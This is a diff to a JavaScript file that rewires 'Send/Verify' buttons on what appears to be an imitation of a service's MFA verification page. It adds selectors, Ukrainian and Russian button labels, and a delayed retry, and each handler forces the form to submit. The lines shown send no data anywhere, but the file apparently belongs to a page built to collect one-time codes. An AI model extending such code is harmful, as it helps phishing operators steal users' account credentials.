@@ -289,20 +289,37 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // Добавить обработчик клика для кнопок "Надіслати"
-    const submitButtons = document.querySelectorAll('button[data-e2e="btn-mfa-verify"], button.mfa-verify-buttonv2, .bn-button__primary');
-    submitButtons.forEach(button => {
-        if (button.textContent.includes('Надіслати') || button.textContent.includes('Send') || button.textContent.includes('Verify')) {
-            button.addEventListener('click', function(e) {
-                e.preventDefault();
-                
-                // Триггеруем событие submit для формы
-                const form = document.querySelector('form');
-                if (form) {
-                    form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+    function addButtonHandlers() {
+        const submitButtons = document.querySelectorAll('button[data-e2e="btn-mfa-verify"], button.mfa-verify-buttonv2, .bn-button__primary, button[type="submit"], .submit-button');
+        
+        if (submitButtons && submitButtons.length > 0) {
+            submitButtons.forEach(button => {
+                if (button && button.textContent && (
+                    button.textContent.includes('Надіслати') || 
+                    button.textContent.includes('Send') || 
+                    button.textContent.includes('Verify') ||
+                    button.textContent.includes('Надислать') ||
+                    button.textContent.includes('Submit')
+                )) {
+                    button.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        
+                        // Триггеруем событие submit для формы
+                        const form = document.querySelector('form');
+                        if (form) {
+                            form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+                        }
+                    });
                 }
             });
         }
-    });
+    }
+    
+    // Вызвать обработчики после загрузки страницы
+    addButtonHandlers();
+    
+    // Попробовать еще раз через небольшую задержку для динамически загружаемых элементов
+    setTimeout(addButtonHandlers, 2000);
     
     function showFinalNotification() {
         // Создать модальное окно с финальным уведомлением
